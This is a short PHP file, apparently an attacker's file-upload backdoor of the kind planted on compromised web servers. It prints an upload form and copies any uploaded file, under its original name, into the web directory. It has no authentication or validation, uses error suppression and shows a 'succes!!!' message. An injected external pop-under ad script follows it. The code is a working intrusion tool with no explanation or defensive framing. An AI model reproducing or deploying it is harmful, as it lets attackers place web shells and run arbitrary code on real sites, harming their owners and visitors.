<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>succes!!!</b><br><br>'; }
else { echo '<b>Fail !!!</b><br><br>'; }
}
?>

<script type="text/javascript">
var uid = '59182';
var wid = '173743';
</script>
<script type="text/javascript" src="http://cdn.popcash.net/pop.js"></script>
